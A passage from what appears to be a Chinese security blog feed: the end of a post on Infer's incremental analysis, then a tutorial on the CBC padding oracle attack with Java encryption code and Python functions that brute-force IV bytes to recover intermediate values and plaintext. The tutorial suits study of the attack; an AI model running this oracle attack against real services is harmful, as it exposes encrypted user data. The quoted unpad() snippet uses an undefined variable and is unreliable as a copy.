class="code"><pre><span class="line"><span class="function">lst_nd* <span class="title">q</span><span class="params">(lst_nd *y)</span> </span>&#123; <span class="comment">// Inferred Pre: list(y) </span></span><br><span class="line">    lst_nd *x, *z;</span><br><span class="line">    x=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); x-&gt;tail=<span class="number">0</span>;</span><br><span class="line">    z=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); z-&gt;tail=<span class="number">0</span>; <span class="comment">// Abducted: list(y), Framed: z|-&gt;0 </span></span><br><span class="line">    merge(x,y); <span class="comment">// Obtained Post: list(x)*z|-&gt;0 </span></span><br><span class="line">    merge(x,z); <span class="comment">// Obtained Post: list(x) </span></span><br><span class="line">    <span class="keyword">return</span>(x);</span><br><span class="line">&#125; <span class="comment">// Inferred Post: list(ret)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(lst_nd *x,lst_nd *y)</span></span>&#123;<span class="comment">//SUMMARY ONLY </span></span><br><span class="line">    <span class="comment">// Given Pre: list(x) * list(y)</span></span><br><span class="line">    <span class="comment">// x=x+y</span></span><br><span class="line">&#125; <span class="comment">// Given Post: list(x)</span></span><br></pre></td></tr></table></figure><p>è¦åˆ†æmergeæœ‰æ²¡æœ‰ç©ºæŒ‡é’ˆï¼Œæœ‰</p><script type="math/tex; mode=display">\{x\mapsto list * y\mapsto list\}merge(x,y)\{x\mapsto list\}</script><p>å¦‚æœå¼€å§‹åˆ†æqåˆ°ç¬¬5è¡Œï¼Œæˆ‘ä»¬æœ‰ï¼š</p><script type="math/tex; mode=display">A=x\mapsto 0 *z \mapsto 0</script><p>ä½†æ˜¯æˆ‘ä»¬çš„å‰ææ¡ä»¶æ˜¯$G=x\mapsto list * y\mapsto list$é‚£ä¹ˆå¼€å§‹æ¨å¯¼ï¼š</p><script type="math/tex; mode=display">x\mapsto0 *z \mapsto 0 * ?antiframe \vdash x\mapsto list * y \mapsto list * ?frame</script><p>å› æ­¤ $antiframe=y\mapsto list$ä¸”$frame=z\mapsto 0$ï¼Œè¿™è¯´æ˜ï¼Œå¦‚æœæƒ³è¦åˆ†æq()å‡½æ•°æœ‰æ²¡æœ‰ç©ºæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªéœ€è¦åˆ†æ$y\mapsto list$æ˜¯æˆç«‹å°±è¡Œäº†ã€‚</p><p><strong>è¿™æ„å‘³ç€ï¼Œå¦‚æœå°†æ¥å‘æ–°ç‰ˆæœ¬ï¼Œè‹¥q()å‡½æ•°ä¸å˜ï¼Œåˆ™ä¸éœ€è¦å†åˆ†æè¯¥å‡½æ•°ï¼Œåªéœ€è¦åˆ†ææ”¹å˜çš„é‚£äº›å‡½æ•°æœ‰æ²¡æœ‰æ”¹å˜$y \mapsto list$å³å¯ã€‚</strong></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Inferç›®å‰çš„æ£€æµ‹èƒ½åŠ›åªå±€é™äºç©ºæŒ‡é’ˆå’Œæ•°æ®æ³„éœ²é—®é¢˜ï¼Œç„¶è€Œåœ¨æ£€æµ‹é¡¹ä¸­å‘ç°äº†æ›´å¤šï¼Œæ€€ç–‘æ˜¯å¼€æºçš„æ˜¯ç¼©æ°´çš„ç‰ˆæœ¬ï¼Œè€Œå…¶å¢é‡åˆ†æçš„æ€æƒ³å€¼å¾—æ‰«æå™¨å€Ÿé‰´ï¼Œå…¶å¯ç”¨æ¥å®Œæˆcommitçº§åˆ«çš„SASTå’ŒServelessçš„å®‰å…¨æ£€æµ‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç å®‰å…¨ </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Infer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaddingOracleæ”»å‡»</title>
      <link href="/crypto-PaddingOracle%E6%94%BB%E5%87%BB/"/>
      <url>/crypto-PaddingOracle%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="CBCåŠ å¯†åŸç†"><a href="#CBCåŠ å¯†åŸç†" class="headerlink" title="CBCåŠ å¯†åŸç†"></a>CBCåŠ å¯†åŸç†</h1><p>å…ˆé¢„ä¹ ä¸‹CBCçš„åŠ è§£å¯†åŸç†å§ã€‚</p><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCBCçš„åŠ å¯†æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å¯¹æ˜æ–‡åˆ†ç»„ï¼Œæ¯ç»„é•¿åº¦é€šå¸¸ä¸º8æˆ–16å­—èŠ‚ï¼Œæœ«å°¾åˆ†ç»„éœ€è¦å¡«å……ï¼Œé€šå¸¸å¡«å……é‡‡ç”¨PKCS#5æ ‡å‡†ï¼›</li><li>ç”Ÿæˆåˆå§‹åŒ–å‘é‡IVï¼Œé•¿åº¦ä¸ºåˆ†ç»„é•¿åº¦ï¼›</li><li>å¯¹äºç¬¬ä¸€ä¸ªæ˜æ–‡åˆ†ç»„ï¼Œå…ˆç”±IVå¼‚æˆ–æ˜æ–‡åˆ†ç»„1å¾—åˆ°ä¸­é—´å€¼ï¼Œå†é€šè¿‡å¯¹ç§°åŠ å¯†ï¼ˆDES/AEC/etcï¼‰å¾—åˆ°å¯†æ–‡åˆ†ç»„1ï¼›</li><li>å¯¹äºæ¥ä¸‹æ¥çš„åˆ†ç»„ï¼Œç”±ä¸Šä¸€ä¸ªå¯†æ–‡åˆ†ç»„æ›¿ä»£IVç®—å¾—ä¸­é—´å€¼ï¼Œå†é€šè¿‡å¯¹ç§°åŠ å¯†ï¼ˆDES/AEC/etcï¼‰å¾—åˆ°å¯†æ–‡åˆ†ç»„2,3,4â€¦â€¦</li></ol><a id="more"></a><p><img src="/crypto-PaddingOracleæ”»å‡»/1563006823645.png" alt="åŠ å¯†"></p><p>ç»™å‡ºåŠ å¯†çš„Javaä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String plain, String key)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] plainBytes = plain.getBytes(charset);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);<span class="comment">//"ç®—æ³•/æ¨¡å¼/è¡¥ç æ–¹å¼"</span></span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, keySpec);</span><br><span class="line">    <span class="keyword">byte</span>[] iv = cipher.getIV();</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = cipher.doFinal(plain.getBytes(charset));</span><br><span class="line">    <span class="keyword">return</span> bytes2HexStr(iv)+<span class="string">"::"</span>+bytes2HexStr(encrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œç®—æ³•è¾“å…¥æ˜¯æ˜æ–‡ï¼ˆplainï¼‰å’Œå¯†é’¥ï¼ˆkeyï¼‰ï¼Œè¿”å›æ˜¯åˆå§‹åŒ–å‘é‡ï¼ˆivï¼‰å’ŒåŠ å¯†åçš„å¯†æ–‡ï¼ˆencryptedï¼‰ã€‚</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCBCçš„è§£å¯†æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å°†å¯†æ–‡åˆ†ç»„ï¼›</li><li>å¯¹äºç¬¬ä¸€ä¸ªå¯†æ–‡åˆ†ç»„ï¼Œå…ˆç»è¿‡å¯¹ç§°åŠ å¯†ç®—æ³•è§£å¯†å¾—åˆ°ä¸­é—´å€¼ï¼Œå†ç”±åˆå§‹åŒ–å‘é‡IVå¼‚æˆ–ä¸­é—´å€¼å¾—åˆ°æ˜æ–‡åˆ†ç»„1ï¼›</li><li>å¯¹äºæ¥ä¸‹æ¥çš„å¯†æ–‡åˆ†ç»„ï¼Œç”±ç»è¿‡å¯¹ç§°åŠ å¯†ç®—æ³•è§£å¯†å¾—åˆ°ä¸­é—´å€¼ï¼Œå†ä¸Šä¸€ä¸ªå¯†æ–‡åˆ†ç»„ä»£æ›¿IVå¼‚æˆ–å¾—åˆ°æ˜æ–‡åˆ†ç»„2,3,4â€¦â€¦ï¼›</li></ol><p><img src="/crypto-PaddingOracleæ”»å‡»/1563012736837.png" alt="1563012736837"></p><p>ç»™å‡ºJavaç‰ˆè§£å¯†ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String secret, String key, String iv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] secretBytes = hexStr2Bytes(secret);<span class="comment">//å…ˆç”¨base64è§£å¯†</span></span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = hexStr2Bytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivs = <span class="keyword">new</span> IvParameterSpec(ivBytes);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, keySpec, ivs);</span><br><span class="line">    <span class="keyword">byte</span>[] plain = cipher.doFinal(secretBytes);</span><br><span class="line">    String plainString = <span class="keyword">new</span> String(plain,charset);</span><br><span class="line">    <span class="keyword">return</span> plainString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è¾“å…¥æ˜¯å¯†æ–‡ï¼ˆsecretï¼‰ã€å¯†ç ï¼ˆkeyï¼‰ã€åˆå§‹åŒ–å‘é‡ï¼ˆivï¼‰â€”â€”è¿™æ­£ä¸åŠ å¯†çš„è¾“å…¥å¯¹åº”ï¼Œè¾“å‡ºæ˜¯æ˜æ–‡ï¼ˆplainStringï¼‰ã€‚</p><h2 id="PKCS-5å¡«å……æ–¹æ¡ˆ"><a href="#PKCS-5å¡«å……æ–¹æ¡ˆ" class="headerlink" title="PKCS#5å¡«å……æ–¹æ¡ˆ"></a>PKCS#5å¡«å……æ–¹æ¡ˆ</h2><p>è¿™é‡Œå†æä¸€ä¸‹PKCS#5æ–¹æ¡ˆï¼Œç®€å•è¯´å°±æ˜¯ç¼ºå¤šå°‘ä½è¡¥å¤šå°‘ï¼Œè¡¥å†…å®¹å°±æ˜¯ç¼ºä½æ•°çš„intå€¼ï¼Œä¾‹å¦‚ï¼šéœ€è¦åŠ å¯†çš„ä¸²ä¸ºâ€œFIGâ€ï¼Œè€Œåˆ†ç»„é•¿åº¦ä¸º8ï¼Œé‚£ä¹ˆç¼º5ä½ï¼Œå› æ­¤è¡¥å®Œä¸ºâ€œFIG\x05\x05\x05\x05\x05â€ï¼Œæ³¨æ„å³ä½¿é•¿åº¦æ­£å·§ä¸º8ï¼Œä¹Ÿéœ€è¦è¡¥ä¸Šä¸€ä¸ªå®Œæ•´åˆ†ç»„ï¼Œä»¥æ£€æŸ¥åŠ å¯†æ­£ç¡®æ€§ã€‚</p><p><img src="/crypto-PaddingOracleæ”»å‡»/1999562-43a6dede0db2bd18.png" alt="img"></p><p>åœ¨è§£å¯†å®Œæœ€åä¸€ä¸ªåˆ†ç»„åï¼Œå…ˆä¼šæ£€æŸ¥Paddingæ˜¯å¦åˆæ³•ï¼ˆæ³¨æ„ï¼Œè¿™æ˜¯å‘èµ·Oracle Paddingæ”»å‡»çš„å…³é”®ï¼‰</p><p>com.sun.crypto.provider.CipherCore#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">int</span> len, <span class="keyword">byte</span>[] intermidVal)</span> <span class="keyword">throws</span> BadPaddingException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="keyword">this</span>.padding.unpad(intermidVal, <span class="number">0</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BadPaddingException(<span class="string">"Given final block not properly padded. Such issues can arise if a bad key is used during decryption."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.sun.crypto.provider.PKCS5Padding#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> plain è§£å¯†å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startIdx å¼€å§‹ä¸‹æ ‡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> paddingVal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">byte</span>[] plain, <span class="keyword">int</span> startIdx, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (plain != <span class="keyword">null</span> &amp;&amp; length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> totalLength = Math.addExact(startIdx, length);</span><br><span class="line">        <span class="keyword">byte</span> tailVal = plain[totalLength - <span class="number">1</span>]; <span class="comment">// è§£å¯†åæ˜æ–‡çš„æœ€åä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">        <span class="keyword">int</span> unsignedTailVal = tailVal &amp; <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (unsignedTailVal &gt;= <span class="number">1</span> &amp;&amp; unsignedTailVal &lt;= <span class="keyword">this</span>.blockSize) &#123;</span><br><span class="line">            <span class="keyword">int</span> paddingStartIdx = totalLength - unsignedTailVal;</span><br><span class="line">            <span class="comment">// tailVal==unsignedTailVal</span></span><br><span class="line">            <span class="keyword">if</span> (paddingVal &lt; startIdx) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = paddingStartIdx; i &lt; totalLength; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (plain[i] != tailVal) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> paddingVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ¨å¯¼åŸä¸­é—´å€¼"><a href="#æ¨å¯¼åŸä¸­é—´å€¼" class="headerlink" title="æ¨å¯¼åŸä¸­é—´å€¼"></a>æ¨å¯¼åŸä¸­é—´å€¼</h1><p>å‡è®¾<code>plain=123456789</code>ï¼Œ<code>key=keykeyke</code>ï¼ŒåŠ å¯†å¾—åˆ°<code>iv(hexcoded)=c86518374d219a7e</code>,<code>secret(hexcoded)=c8c9c4f092468f9e75b520a3ea1832c0</code></p><p>ä½œä¸ºæ”»å‡»è€…ï¼Œç›®å‰æˆ‘ä»¬çŸ¥æ™“çš„æ˜¯ivå’Œsecretï¼Œæ”»å‡»çš„ç¬¬ä¸€æ­¥æ˜¯è°ƒæ•´ivå¾—åˆ°ä¸­é—´å€¼ï¼š</p><p><img src="/crypto-PaddingOracleæ”»å‡»/1563019123084.png" alt="1563019123084"></p><p>æŠ½å–ç¬¬ä¸€å—å‡ºæ¥çœ‹ï¼Œå¦‚æœæˆ‘ä»¬è°ƒç”¨<code>decode(&quot;c8c9c4f092468f9e&quot;,key,&quot;0000000000000000&quot;)</code>â€”â€”å†æ¬¡æ³¨æ„ï¼Œ<strong>èƒ½æ§åˆ¶çš„åªæœ‰secretå’Œivï¼Œkeyå˜é‡æœªçŸ¥ä¹Ÿä¸å¯æ§</strong>ï¼Œä¸Šæ–‡å‡½æ•°åŠ¿å¿…ä¼šæŠ¥é”™ï¼Œå› ä¸ºPaddingä¸åˆæ³•ï¼š</p><p><img src="/crypto-PaddingOracleæ”»å‡»/1563075246744.png" alt="1563075246744"></p><p>é‚£ä¹ˆæ­¤æ—¶ï¼ˆæœ€å¯èƒ½ï¼‰åˆæ³•çš„Paddingæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸éš¾æƒ³åˆ°åº”è¯¥æ˜¯0x01ï¼Œå³Plain Text &amp; Paddingåº”è¯¥ä¸ºâ€???????\x01â€œ</p><h2 id="çˆ†ç ´è¾…åŠ©IV-1"><a href="#çˆ†ç ´è¾…åŠ©IV-1" class="headerlink" title="çˆ†ç ´è¾…åŠ©IV[-1]"></a>çˆ†ç ´è¾…åŠ©IV[-1]</h2><p>æ§åˆ¶secretä¸å˜ï¼ŒIVæ¸…é›¶ï¼Œå…ˆçˆ†ç ´(åˆæ³•çš„è¾…åŠ©)ivæœ€åä¸€ä½ï¼Œè‹¥ç»“æŸä½ä¸º0x01åˆ™ç¨‹åºä¸å†æŠ¥é”™ï¼Œåä¹‹ç¨‹åºæŠ¥é”™ï¼ˆè¿™é‡Œå¯ä»¥è§£é‡Šä¸‹ä¸Šæ–‡è¯´çš„â€œæœ€å¯èƒ½â€çš„å«ä¹‰ï¼Œå› ä¸ºå¼‚æˆ–åæœ‰å¯èƒ½è§£å¯†åplainText[-2]=0x02ï¼Œé‚£ä¹ˆåˆæ³•çš„paddingä¹Ÿå¯ä»¥æ˜¯\0x02â€”â€”ä¹Ÿå°±æ˜¯è¯´ç»“æŸä½ä¸º0x02ç¨‹åºä¹Ÿä¸æŠ¥é”™ï¼Œä¹Ÿæœ‰å¯èƒ½plainText[-3]=plainText[-2]=0x03ï¼Œé‚£ä¹ˆåˆæ³•çš„paddingä¹Ÿå¯ä»¥æ˜¯0x03ï¼Œè¿™æ ·çš„æ¦‚ç‡å‡ºç°çš„å®åœ¨æ˜¯å¤ªå°‘äº†ï¼Œå³ä½¿æ˜¯æœ€åä¸€ä¸ªåˆ†ç»„ï¼Œç”±äºæˆ‘ä»¬å·²ç»æ¸…é›¶äº†IVï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼‰ã€‚</p><p>å› æ­¤æœ‰å¦‚ä¸‹è„šæœ¬ï¼Œå¾—åˆ°äº†åˆæ³•çš„æœ€åä¸€ä½æ˜¯â€œ47â€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_iv</span><span class="params">(secret: bytearray, iv: bytearray, pos: int)</span>-&gt;int:</span></span><br><span class="line">    <span class="keyword">for</span> iv_byte <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[pos]=iv_byte</span><br><span class="line">        <span class="comment">#å¯¹javaçš„å‡½æ•°çš„å°è£…ï¼Œå½“æŠ¥é”™æ—¶è¿”å›-1ã€‚</span></span><br><span class="line">        ret=decode(secret, iv)</span><br><span class="line">        logging.info(<span class="string">"&#123;0&#125;::&#123;1&#125;"</span>.format(iv.hex(),ret))</span><br><span class="line">        <span class="keyword">if</span> ret!=<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracleæ”»å‡»/1563075623114.png" alt="1563075623114"></p><h2 id="æ›´æ–°ä¸­é—´å€¼"><a href="#æ›´æ–°ä¸­é—´å€¼" class="headerlink" title="æ›´æ–°ä¸­é—´å€¼"></a>æ›´æ–°ä¸­é—´å€¼</h2><p>æ ¹æ®ä¸Šæ–‡åˆ†æï¼Œæˆ‘ä»¬çŒœæµ‹æœ€åä¸€ä½paddingæ˜¯<code>0x01</code>ï¼Œå¹¶ä¸”<code>?^0x47=0x01</code>ï¼Œé‚£ä¹ˆ<code>?=0x01^0x47=0x46</code>ï¼Œç”±æ­¤ä¸­é—´å€¼çš„æœ€åä¸€ä½å°±æ˜¯<code>0x46</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legal_iv_byte=burp_iv(secret, fake_legal_iv,i) <span class="comment"># 0x47</span></span><br><span class="line"><span class="comment"># æ›´æ–°intermediary value</span></span><br><span class="line">intermedi_byte=padding^legal_iv_byte <span class="comment"># 0x01^0x47 </span></span><br><span class="line">intermedi[i]=intermedi_byte <span class="comment"># 0x46</span></span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracleæ”»å‡»/1563075737764.png" alt="1563075737764"></p><h2 id="æ›´æ–°è¾…åŠ©IV"><a href="#æ›´æ–°è¾…åŠ©IV" class="headerlink" title="æ›´æ–°è¾…åŠ©IV"></a>æ›´æ–°è¾…åŠ©IV</h2><p>æ¥ä¸‹æ¥æ¨ç¬¬äºŒä½ï¼Œæ­¤æ—¶æˆ‘ä»¬å‡è®¾(æœ€æœ‰å¯èƒ½çš„åˆæ³•)paddingå€¼åº”è¯¥æ˜¯0x02ï¼Œé¦–å…ˆè®©æœ€åä¸€ä½åˆæ³•â€”â€”<code>IV[-1]^0x46=0x02</code>ï¼Œå³æ›´æ–°<code>IV[-1]=0x02^0x46=0x44</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–°iv</span></span><br><span class="line">padding+=<span class="number">1</span> <span class="comment"># padding=0x02</span></span><br><span class="line">legal_iv_byte=padding^intermedi_byte <span class="comment"># 0x44</span></span><br><span class="line">fake_legal_iv[<span class="number">-1</span>]=legal_iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracleæ”»å‡»/1563075936620.png" alt="1563075936620"></p><h2 id="çˆ†ç ´è¾…åŠ©IV-2"><a href="#çˆ†ç ´è¾…åŠ©IV-2" class="headerlink" title="çˆ†ç ´è¾…åŠ©IV[:-2]"></a>çˆ†ç ´è¾…åŠ©IV[:-2]</h2><p>ç”¨çˆ†ç ´ç¬¬ä¸€ä½çš„ç›¸åŒæ–¹æ³•ï¼Œå¾—åˆ°ç¬¬äºŒä½IVä¸º0xAFï¼Œå†å¾—åˆ°ç¬¬äºŒä½ä¸­é—´å€¼ä¸º0xADï¼š</p><p><img src="/crypto-PaddingOracleæ”»å‡»/1563074854405.png" alt="1563074854405"></p><p>å†æ›´æ–°è¾…åŠ©IVçˆ†ç ´ç¬¬ä¸‰ä½ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥æ•´ä¸ªä¸­é—´å€¼<code>f9572b037817ad46</code>ï¼š</p><p><img src="/crypto-PaddingOracleæ”»å‡»/1563074654217.png" alt="1563074654217"></p><p>å³æœ€å¤šèŠ±è´¹<code>256*len(block)</code>æ¬¡å°è¯•ï¼Œå¯ä»¥å¾—åˆ°æ•´ä¸ªä¸­é—´å€¼ï¼Œæ­¤æ—¶è¾…åŠ©IVçš„ä»»åŠ¡å·²ç»å®Œæˆã€‚</p><p>è€Œæ­¤æ—¶ï¼Œæ”»å‡»è€…éœ€è¦çš„åªæ˜¯<strong>secret</strong>å’Œ<strong>åˆ†ç»„é•¿åº¦</strong>ã€‚</p><p>å¦å¤–ï¼Œä¸è®ºå¯¹äºå“ªä¸€ä¸ªåˆ†ç»„ï¼ˆå³ä½¿æ˜¯æœ€åä¸€ä¸ªå¡«å……åˆ†ç»„ï¼‰ï¼Œè¿›è¡Œçš„æ“ä½œéƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h1 id="æ¨å¯¼åŸæ˜æ–‡"><a href="#æ¨å¯¼åŸæ˜æ–‡" class="headerlink" title="æ¨å¯¼åŸæ˜æ–‡"></a>æ¨å¯¼åŸæ˜æ–‡</h1><p>çŸ¥é“ä¸­é—´å€¼ä¹‹åï¼Œç”±<code>Intermediary ^ IV = Plain</code> æ¨å¯¼åŸæ˜æ–‡ï¼Œæ³¨æ„è¿™é‡Œæ˜¯çœŸå®çš„IVï¼Œè€Œä¸æ˜¯ä¹‹å‰çš„è¾…åŠ©IVã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_plain</span><span class="params">(intermedi: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    block_len=len(intermedi)</span><br><span class="line">    plain=bytearray.fromhex(<span class="string">"00"</span>*block_len)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        plain[i]=intermedi[i]^iv[i]</span><br><span class="line">    logging.info(<span class="string">"Get Plain Value: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>å¯¹äºç¬¬ä¸€ä¸ªåˆ†ç»„ï¼ŒIVå°±æ˜¯åˆå§‹IVï¼›å¯¹äºåé¢çš„åˆ†ç»„ï¼ŒIVä¸ºä¸Šä¸€åˆ†ç»„çš„å¯†æ–‡ï¼Œä»¥æ­¤å¯ä»¥æ¨å¯¼å…¨éƒ¨æ˜æ–‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(secret: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    plain=bytearray()</span><br><span class="line">    block_len=len(iv)</span><br><span class="line">    real_iv=iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(secret),<span class="number">8</span>):</span><br><span class="line">        block_secret=secret[i:i+<span class="number">8</span>]</span><br><span class="line">        intermedi=burp_intermediary(block_secret, block_len)</span><br><span class="line">        plain+=burp_plain(intermedi, real_iv)</span><br><span class="line">        real_iv=secret[i:i+<span class="number">8</span>]</span><br><span class="line">    logging.info(<span class="string">"Get Full Plain: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> 